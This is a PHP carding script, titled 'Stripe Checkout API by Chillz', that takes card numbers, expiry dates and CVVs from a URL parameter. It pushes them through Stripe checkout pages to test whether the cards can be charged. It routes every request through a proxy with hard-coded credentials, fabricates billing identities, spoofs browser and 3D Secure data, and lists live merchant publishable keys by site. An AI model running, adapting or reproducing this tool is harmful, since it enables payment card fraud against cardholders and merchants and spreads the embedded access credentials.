 <?php

///---- Stripe Checkout API by Chillz ----///
/// Supported websites ////
///// pk_live_51GjnvOEtynl19Eg2AOFRLLS54B2hzHZvHVgadRoeO1hZsMbvhZ54lzfRQsLVzXB7rvCeB1l7plSXA3mVqQJa1L1P008HUtbtyF - SMS pool
///// pk_live_51KigCwEVzZTm6CjTuQ88HgC13eLdzKqnwP5mUd9gpWyWXAqVnmuw0XXvgc7wAkZKpmyGXxC9dqAf3O63n6LU2hEx00ooOyDv8v - SMS active
///// pk_live_51IXC1AJY8rQ0RqGBi27Tpwu60xUKbJpFIcSsv9f30LNn4UwmGTMfB2c7suXuJe3yKQzyCPjGvxs16N4ESUJT4d2Z00iEuFJXvf - solve captcha
////// pk_live_VFQFgOs5fhg9cjAohB05ZhdQ - giftgo now
///// pk_live_Wk94I65ZReejiPdoFfUrNIyV00szE3z6vP - Cloudary
///// pk_live_51In2OQF6KbQh44q11COsLzIbvnPzOdzg6WIOXQHDFMm9TnI4pjt1tJm9V6tulgkaBozAHONpUdjLHJeJDW1rxneD001MeE6VpM - susschegg
///// pk_live_51HKJ66L4al9TyiSIncgm7UUrtiBGLzeJoYBJuECYRyVYR8pxkvLBeXnMr5s4tXhzVgqMzsPBo8v6qFzcO6quYwW0006y19HjAj - Omlet Plus
///// pk_live_T5j5vpjgnfBOiHyqWwfFqRmm - CLoudzy
//// pk_live_on2DxFdzeJsK590OiyjDxSCp00cAJzXqzg - latium
//// pk_live_51HgodtGRvHz7HxXDZGoHvg6LA2ETexYxMH2A4LYbNN8n6lqzGuk3CkdrHWFQ3P3B7Dh448mBs6OJnpIFl7V9sgYD00FLvhh9TB - hydra proxy
//// pk_live_51Fh50mKgip3ZsdRxdFMOmmTOBfXrOZx6gqRIIL7OwAMT6IvXgbOy6xKDjlfjt7PA3ct1lyajgaHKA0f4tUitVYma00bQjoMflK - proxiware
//// pk_live_51LL4cJEbMs4mY7FHrEWwonoQKaq8FjsFsm3ViqWxQBQPy1OdWdAM5h5MjbahLSAKwfFCm6HowgBySE9u7vz1bncZ007jhAn3Z3 - opt pay
//// pk_live_zLfmlDVbFZvKKplI9fxUCkKb00yl0v7IWI - unknown proxies
//// pk_live_51HOnXTFcVrrz5cZoAPMsnd7Ut8EhJExnWYQEVfaxnZDx9z4cTomieeMEpgJGOKtgZNMRLcDLP0LmVh0JVBPjRgtb00DKRi4Iig - Copy AI
//// pk_live_51K52NcAK9pkzffxSxhr2maH3LCInmtpRdRDjFcmo53fqFIGq4280p0lYZ4BzYOy4kX0J21Vl6aeVid8tZYtMGAhJ00RHNviPRQ - top up.cc
//// pk_live_51HYse1Ku89xKyUttaoUeH6XxJ5cGYzOAKYis4UpE1rBmCxI8Hb3GYoc4qE9IUJgbavk3GITTEczZXMEJ6HDshNKS007nZqvvnt - spotify.ax

error_reporting(0);
$sec = $_GET['sec'];
$pk = $_GET['pk'];
$amt = $_GET['amt'];

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['lista']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 


function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 

$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);


function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}



if(!is_dir("cookies")) mkdir("cookies");
$cookies = getcwd()."/cookies/chillz".rand(10000, 9999999).".txt";

$proxy_host = "us.pro.stellaproxies.com"; 
$proxy_port = "5965"; 
$loginpassw = "OyzCPrZx:5t7AXHRM"; 
$ch = curl_init(); 
 curl_setopt($ch, CURLOPT_URL, 'https://ip.nf/me.json'); 
 curl_setopt($ch, CURLOPT_HEADER, 0); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port); 
 curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP'); 
 curl_setopt($ch, CURLOPT_PROXY, $proxy_host); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw); 
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);  
 $ips = curl_exec($ch); 
 curl_close($ch); 
 $ip1 = GetStr($ips, '"ip":"','"');


///////////////=============================////////////////////////

$url = "https://api.stripe.com/v1/payment_pages/$sec/init";
$data = "key=pk_live_7lZL4PUkxnrnwFv8UQ9Ohyih00oqqgbyxi&eid=NA&browser_locale=en-US&redirect_type=stripe_js";
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_PROXY => "us.pro.stellaproxies.com:5965",
    CURLOPT_PROXYUSERPWD => "OyzCPrZx:5t7AXHRM",
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://checkout.stripe.com/"
    ],
]);
$ppage = curl_exec($curl);
$ppage_id = json_decode($ppage)->id;
$code = g($ppage, '"code": "','"');
$decline_code = g($ppage, '"decline_code": "','"');

$url = "https://checkout.stripe.com/c/pay/$sec";
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_PROXY => "us.pro.stellaproxies.com:5965",
    CURLOPT_PROXYUSERPWD => "OyzCPrZx:5t7AXHRM",
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    ],
]);
$cs_live = curl_exec($curl);


$url = "https://api.stripe.com/v1/payment_methods";
$data = "type=card&card[number]=$cc&card[cvc]=&card[exp_month]=$mm&card[exp_year]=$yy&billing_details[name]=chillz".rand(0000, 9999)."&billing_details[email]=chillsavvy".rand(0000, 9999)."%40gmail.com&billing_details[address][country]=US&billing_details[address][line1]=30+Hudson+Yards&billing_details[address][city]=New+york&billing_details[address][postal_code]=10001&billing_details[address][state]=NY&guid=NA&muid=NA&sid=NA&key=pk_live_7lZL4PUkxnrnwFv8UQ9Ohyih00oqqgbyxi&payment_user_agent=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666%3B+checkout";
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_PROXY => "us.pro.stellaproxies.com:5965",
    CURLOPT_PROXYUSERPWD => "OyzCPrZx:5t7AXHRM",
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://checkout.stripe.com/"
    ],
]);
$pm = curl_exec($curl);
$id = json_decode($pm)->id;


$url = "https://api.stripe.com/v1/payment_pages/$sec/confirm";
$data = "eid=NA&payment_method=$id&expected_amount=$amt&last_displayed_line_item_group_details[subtotal]=$amt&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_7lZL4PUkxnrnwFv8UQ9Ohyih00oqqgbyxi";
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_PROXY => "us.pro.stellaproxies.com:5965",
    CURLOPT_PROXYUSERPWD => "OyzCPrZx:5t7AXHRM",
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_HTTPHEADER => [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://checkout.stripe.com/"
    ],
]);
$ppage2 = curl_exec($curl);
$client_secret = g($ppage2, '"client_secret": "','"');
$xplode = explode('_secret', $client_secret);
$pi = $xplode[0];
$three_d = g($ppage2, '"three_d_secure_2_source": "','",');
$message = g($ppage2, '"message": "','"');
$url = g($ppage2, '"success_url": "','"');

$data = "source=$three_d&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6IjAyOGY4OGFjLWYxYTctNGViOS05ODQxLTkxNDNmZTRhMTI1YyJ9%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A108.0)+Gecko%2F20100101+Firefox%2F108.0%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key=pk_live_7lZL4PUkxnrnwFv8UQ9Ohyih00oqqgbyxi";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/3ds2/authenticate");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'accept:application/json',
'content-type:application/x-www-form-urlencoded',
'Referer: https://js.stripe.com/',
'Sec-GPC:1')
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, 'us.pro.stellaproxies.com:5965');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'OyzCPrZx:5t7AXHRM');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cuks);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cuks);
$authenticate = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=pk_live_7lZL4PUkxnrnwFv8UQ9Ohyih00oqqgbyxi&is_stripe_sdk=false&client_secret=$client_secret");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'accept:application/json',
'content-type:application/x-www-form-urlencoded',
'Referer: https://js.stripe.com/',
'Sec-GPC:1')
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, 'us.pro.stellaproxies.com:5965');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'OyzCPrZx:5t7AXHRM');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cuks);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cuks);
$final = curl_exec($ch);
$dcode2 = json_decode($final)->last_payment_error->decline_code;
$msg = json_decode($final)->last_payment_error->message;
$status = g($final, '"status": "','"');

sleep(5);

/////////===================/////////////////
if(strpos($final, '"status": "succeeded"')) {
 echo "Aprovada ==>$ip1==> $card ==> Payment Success! - Redirect URL: $url<br>";
}
elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
    echo "Reprovada ==>$ip1==> $card => $status ==> <b>Hcaptcha (Proxy Recomended)</b> => Top up Failed<br>";
}
elseif(strpos($ppage2, '"message": "Your payment has already been processed."')){
    echo "Reprovada ==>$ip1==> $card => $status ==> <b>Expired link</b> => Payment Failed<br>";
}
elseif($status == "requires_action"){
    echo "Reprovada ==>$ip1==> $card => $status ==> <b>OTP TRIGGERED</b> => Payment Failed<br>";
}
elseif(strpos($ppage2, '"status": "requires_action"')){
    echo "Reprovada ==>$ip1==> $card => $status ==> <b>OTP TRIGGERED</b> => Payment Failed<br>";
}
elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
    echo "Reprovada ==> $card => $status ==> <b>generic_decline</b> => Payment Failed<br>";
}
elseif(strpos($pm, '"decline_code": "generic_decline"')){
    echo "Reprovada ==>$ip1==> $card => $status ==> <b>generic_decline</b> => Payment Failed<br>";
}
else {
    echo "Reprovada ==>$ip1==> $card => 1st Response: [$code - $decline_code] => $status ==> $msg ==> $dcode2 => $message => Payment Failed<br>";
}
?>

